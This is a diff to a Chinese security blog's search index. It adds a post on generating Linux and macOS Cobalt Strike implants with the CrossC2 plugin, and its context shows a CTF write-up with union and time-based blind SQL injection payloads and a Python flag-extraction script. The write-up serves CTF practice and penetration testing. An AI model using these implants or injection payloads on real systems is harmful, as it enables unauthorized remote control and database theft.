@@ -1,6 +1,15 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[CS解决Linux、MacOS上线]]></title>
+    <url>%2FCobaltStrike-tips-1.html</url>
+    <content type="text"><![CDATA[安装过程先下载cna插件 和 相应系统的CrossC2文件： https://github.com/gloxec/CrossC2/releases/ tips：这里就很坑了，作者的文档没有写太清楚，百度上面的几个文章都是写的下载genCrossC2.Linux，直接调用api可以生成木马，但是cna插件怎么都生不成插件。后来想到可能是要把这个对应版本的CrossC2放到本地才行，一试果然。 修改插件中的 1$genCC2 = "d:/genCrossC2.Win.exe"; # &lt;-------- fix 这就安装好了。 使用方法（kali，win缺少dll）其实在总结这个使用方法的时候，遇到了很多很多的坑，比如windows下，运行genCrossC2缺少dll，Linux下生成的木马上不了线，因为证书问题。所以如果你想少走点弯路，请做好下面的每一步。 1）下载服务器上cs的证书，位置在CS根目录的.cobaltstrike.beacon_keys,这个必须要下载，最开始我觉得服务器上的文件和我本地一样（整个目录copy上去的），然后就怎么也上不了线。 2）生成木马时，要注意以下点： 1.证书必须是从服务器上下载的证书 2.listener必须是https的，因为这个插件只支持https 显示这样说明生成成功了，然后直接复制命令到linux中执行即可上线。 当然也可以直接调用接口来生成马： 1/root/cs3.14/genCrossC2.Linux IP 88 /tmp/keys null Linux x64 /tmp/CrossC2-test 推荐下我的知识星球 经常会分享一些挖洞知识，前言技巧，优秀文章等，欢迎各位加入。 投稿可享受免费加入，投稿要求：原创首发内容，且一个月内禁止发布在其他媒体或博客，内容要求图文并茂，不可是网上烂大街的文章。 投稿邮箱：78941695@qq.com]]></content>
+      <tags>
+        <tag>渗透测试</tag>
+        <tag>CobaltStrike</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[某CTF中两道注入的总结]]></title>
     <url>%2Fmysqli.html</url>
     <content type="text"><![CDATA[某次CTF两道SQL注入题目总结 1、sqli （很简单的注入）http://9a7787035c6e4b61aea09f5d44bc383ca34b5696074d4c25.changame.ichunqiu.com/search.php?SearchWords=123 注入在搜索框，当时尝试注入，测试： 12123' and if(1=1,sleep(5),1)--+ #无延迟123' and sleep(5) --+ #无延迟 很奇怪，以前用第一个payload是可以延迟的，这次测试无效果，我以为此处不存在注入，但是整个网站只有这一处传参的地方，另外就是很多队伍都秒做出来了。于是拿sqlmap跑了一下： 不光是有time base的sqli，还有union select的sqli，所以总结下来只能说我菜，检测sql注入的payload还不够完善，所以要总结这篇knowledge base。 对sqlmap的payload进行分析后，还总结出两个检测payload： 12123' union select 1 --+ #与常规页面不同123' union select sleep(5)--+ #延时5s 然后就是依次的注入过程： 1234123' union select database() --+ #查数据库名123' union select group_concat(table_name) from information_schema.tables where table_schema='ctf' --+ #查表名123' union select group_concat(column_name) from information_schema.columns where table_name='flag' --+ #查列名123' union select flag from flag --+ # dump flag 关于延时注入的总结在下一个题目当中总结更详细些。 2、blind总结下来，还是自己对SQL注入的检测不够熟悉，最开始也是没发现sqli的，后来和朋友交流后，他给我一个半成品的payload，大概是这样的： 1admin'%0aunion%0aselect 1,if(1=1,sleep(2),1)' %0a主要是绕过题目对union 和 select的拦截，然后在后续的调试过程中也是遇到了很多问题，所以本次进行总结，方便以后使用。 运气非常好的是，当sql语句出现错误时，题目则会提示 而语句正确时，则显示如下： 最开始想着用基于布尔的盲注，因为回显不通嘛。最后发现行不通，只能sleep来进行注入。总结一下基于时间盲注在各个阶段的注入语句： 1、获取数据库名： 123admin'%0aunion%0aselect%0a 1,if(substr(select%0adatabase(),1,1)='c',sleep(2),1)'# 可以通过修改len，遍历所有：admin'%0aunion%0aselect%0a 1,if(substr(select%0adatabase(),1,3)='ctf',sleep(2),1)' 2、获取table_name: 12admin'%0aunion%0aselect%0a 1,if(substr(select%0agroup_concat(table_name) from information_schema.tables where table_schema='ctf',1,1)='f',sleep(2),1)# 一般在ctf中，flag都存在flag表，所以无需一位一位遍历，尝试看flag是否存在即可。 12admin'%0aunion%0aselect%0a 1,if(substr(select%0agroup_concat(table_name) from information_schema.tables where table_schema='ctf',1,4)='f',sleep(2),1)#tips:flag未必是第一个表名，所以可以尝试移动offset看是否存在flag表，有时候也是用sqli读取文件获取flag的。 3、获取column_name: 12admin'%0aunion%0aselect%0a 1,if(substr(select%0agroup_concat(column_name) from information_schema.columns where table_name='flag',1,1)='f',sleep(2),1)# 一般在ctf中，flag都存在flag表，所以无需一位一位遍历，尝试看flag是否存在即可。参考2、 4、注入flag： 1admin'%0aunion%0aselect%0a 1,if(substr((select%0aflag from flag),1,5)='flag&#123;',sleep(2),1)' 这里可以先注入下测试flag然后再编写脚本，脚本的话，也可以通过修改len一位一位增加flag长度，最终获取最后的flag，参考如下： 123456789101112131415161718192021222324252627#encoding=utf-8import requestsimport jsonimport timeurl = "http://376514c1a0f741d0a6a2f8634ab4bdd5df164086426741e5.changame.ichunqiu.com/index.php"proxies=&#123;"http":"http://127.0.0.1:8080"&#125;headers = &#123; "Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"&#125;ii = 4pld = 'flag'while True: if "&#125;" in pld: break ii = ii+1 for i in range(30,148): j = chr(i) pld_t= pld+j payload=u"admin'\nunion\nselect\n 1,if(substr((select\nflag from flag),1,&#123;&#125;)='&#123;&#125;',sleep(3),1)'".format(str(ii),pld_t) data = &#123;u"username":payload,"password":"aaa"&#125; #print(payload) st = time.time() res = requests.post(url,data=data,proxies=proxies,headers=headers) if time.time()-st&gt;3: pld = pld+j print(pld) break 编写脚本的时候有个坑点，就是requests post会把data进行urlencode，所以，%0a会变成%250a，尝试了很多方法均不行，所以只好在sql语句中用\n，urlencode以后就是%0a了。 最后希望大家关注我们的公众号：川云安全团队]]></content>
@@ -633,8 +642,8 @@
         <category>DNSLOG</category>
       </categories>
       <tags>
-        <tag>DNSlog</tag>
         <tag>渗透测试</tag>
+        <tag>DNSlog</tag>
       </tags>
   </entry>
   <entry>
